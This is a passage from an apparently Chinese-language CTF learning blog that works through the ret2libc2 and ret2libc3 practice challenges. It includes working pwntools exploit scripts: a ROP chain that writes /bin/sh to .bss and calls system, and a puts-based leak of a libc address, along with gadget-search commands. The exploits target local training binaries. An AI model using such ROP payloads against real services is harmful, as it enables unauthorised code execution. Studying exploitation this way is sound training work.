class=&#34;line&#34;&gt;bar:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl	%ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl	%esp, %ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	subl	$16, %esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl	$5, -4(%ebp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl	-4(%ebp)                   // 这一句是干什么的?????? 这一句和上一句组合,压入参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call	foo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	addl	$4, %esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b=&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        foo(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;关于参数等再怎么具体的,要看看编译原理? 之类的?&lt;/p&gt;
&lt;h2 id=&#34;ret2libc2&#34;&gt;&lt;a href=&#34;#ret2libc2&#34; class=&#34;headerlink&#34; title=&#34;ret2libc2&#34;&gt;&lt;/a&gt;ret2libc2&lt;/h2&gt;&lt;p&gt;​		相比ret2libc1,ret2libc2里没有&amp;#x2F;bin&amp;#x2F;sh,需要我们自己从其他渠道获取&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08048490&lt;/span&gt; &amp;lt;system@plt&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;8048641&lt;/span&gt;:	e8 &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;a fe ff ff       	call   &lt;span class=&#34;number&#34;&gt;8048490&lt;/span&gt; &amp;lt;system@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08048460&lt;/span&gt; &amp;lt;gets@plt&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;80486b&lt;/span&gt;a:	e8 a1 fd ff ff       	call   &lt;span class=&#34;number&#34;&gt;8048460&lt;/span&gt; &amp;lt;gets@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0804872f&lt;/span&gt; : pop ebp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0804872c&lt;/span&gt; : pop ebx ; pop esi ; pop edi ; pop ebp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0804843d&lt;/span&gt; : pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		因为ret2libc2里有gets函数,所以可以先利用这个,读取一个&amp;#x2F;bin&amp;#x2F;sh,写入到哪呢? 写入到bss段,为什么写入到bss段呢?bss段的地址又怎么选呢???????&lt;/p&gt;
&lt;p&gt;​		写入进去后再从这里读取就可以了!&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.data:0804A03F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:0804A040 ; ===========================================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:0804A040&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:0804A040 ; Segment type: Uninitialized&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:0804A040 ; Segment permissions: Read/Write&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		所以payload的构造&lt;/p&gt;
&lt;p&gt;​		payload &amp;#x3D; b”a”*112 + gets + popret + buf + system + exit + buf&lt;/p&gt;
&lt;p&gt;​		payload &amp;#x3D; b”a”*112 + gets + system + buf + buf&lt;/p&gt;
&lt;p&gt;​		在gets的后面要跟一个pop xxx; ret 为什么呢? 因为这里本身是返回地址,在gets执行完后,要想继续执行的话,需要把后面的buf给弹出来,然后再ret,把system当成返回地址? 不知道这么理解对不对,可以调试一下看看&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh  = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets = &lt;span class=&#34;number&#34;&gt;0x08048460&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;number&#34;&gt;0x08048490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf = &lt;span class=&#34;number&#34;&gt;0x0804A040&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;popret = &lt;span class=&#34;number&#34;&gt;0x0804843d&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt; + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(buf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		感觉能行,但是有点小问题,,还有那这个payload是不是也可以呢?payload &amp;#x3D; b”a”*112 + p32(gets) + p32(system) + p32(buf) + p32(buf),如果按照上面的逻辑的话,是的,这个payload没问题! &lt;font color=&#34;red&#34;&gt;所以,究其根本我们是伪造了函数执行过程,只要符合它这个流程,理解本质,根据具体情况构造就可以了!!&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		(不过为什么执行一条命令就EOF了?) 那是因为 system需要获取&amp;#x2F;bin&amp;#x2F;sh…你忘了,直接输入 id  whoami什么的,肯定就一次,可以直接输入&amp;#x2F;bin&amp;#x2F;sh,也可以在exp里面在加一行 sh.send(b”&amp;#x2F;bin&amp;#x2F;sh”)&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;不行,send不行,要两个sendline才可以,send和sendline肯定有区别,回头写pwntools时(pwn入门-6)看一下&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh  = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets = &lt;span class=&#34;number&#34;&gt;0x08048460&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;number&#34;&gt;0x08048490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf = &lt;span class=&#34;number&#34;&gt;0x0804A040&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;popret = &lt;span class=&#34;number&#34;&gt;0x0804872f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt; + p32(gets) + p32(system) + p32(buf) + p32(buf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = b&amp;quot;a&amp;quot;*112 + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(0) + p32(buf)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;ret2libc3&#34;&gt;&lt;a href=&#34;#ret2libc3&#34; class=&#34;headerlink&#34; title=&#34;ret2libc3&#34;&gt;&lt;/a&gt;ret2libc3&lt;/h2&gt;&lt;p&gt;​		相比ret2libc2,system也没了,那就需要从libc中找了,libc的话没有给你版本,就需要泄露个函数地址,然后去找版本,泄漏的话,用puts输出.&lt;/p&gt;
&lt;p&gt;​		是不是需要先换个libc版本呢???? 还是什么????????????????????&amp;#x2F;不对呀,既然需要泄漏函数..那libc版本就是固定的了,为什么呢….是动态链接的事?&lt;/p&gt;
&lt;p&gt;​		先打印出libc_start_main_addr 再说&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; Libcsearcher &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Libcsearcher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret2libc3 = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = ret2libc3.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_got = ret2libc3.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__libc_start_main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = ret2libc3.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt; + puts_plt + main + libc_start_main_got&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Can you find it !?&amp;quot;&lt;/span&gt;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_addr = u32(sh.recv()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(libc_start_main_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		很奇怪,这个脚本感觉没什么问题,但是不行,下面的却可以…….感觉没有什么区别呀………..&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; LibcSearcher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2libc3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret2libc3 = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2libc3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = ret2libc3.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_got = ret2libc3.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__libc_start_main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = ret2libc3.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = flat([&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;112&lt;/span&gt;, puts_plt, main, libc_start_main_got])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Can you find it !?&amp;#x27;&lt;/span&gt;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;get the related addr&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_addr = u32(sh.recv()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_start_main_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;sh.sendlineafter(‘Can you find it !?’, payload) &lt;/p&gt;
&lt;p&gt;sh.sendafter(“Can you find it !?”,payload1)&lt;/p&gt;
&lt;p&gt;区别在这里!!!!!&lt;/p&gt;
&lt;p&gt;还有如果不加[0:4]会是怎样?&lt;/p&gt;
&lt;p&gt;print(sh.recv())看看&lt;/p&gt;
&lt;p&gt;b’\xb0\xde\xdf\xf7\nNo surprise anymore, system disappeard QQ.\nCan you find it !?’&lt;/p&gt;
&lt;p&gt;所以是要前四个字节的意思! &lt;/p&gt;
&lt;p&gt;​		libc的问题参见下面,目前就当已经解决libc的问题了,然后继续做,libcbase的话就是这个&amp;#x2F;lib&amp;#x2F;i386-linux-gnu&amp;#x2F;libc.so.6 (0xf7de5000),&lt;/p&gt;
&lt;p&gt;​		然后就是获取binsh和system的地址,这个可以直接用objdump或者ROPgadget&lt;/p&gt;
&lt;p&gt;​		objdump -d &amp;#x2F;lib&amp;#x2F;i386-linux-gnu&amp;#x2F;libc.so.6 | grep “system”&lt;/p&gt;
&lt;p&gt;​		ROPgadget –binary &amp;#x2F;lib&amp;#x2F;i386-linux-gnu&amp;#x2F;libc.so.6 –string ‘&amp;#x2F;bin&amp;#x2F;sh’&lt;/p&gt;
&lt;p&gt;​		其实泄露了地址,找到了gadget,就是最开始最简单的那个溢出了,&lt;/p&gt;
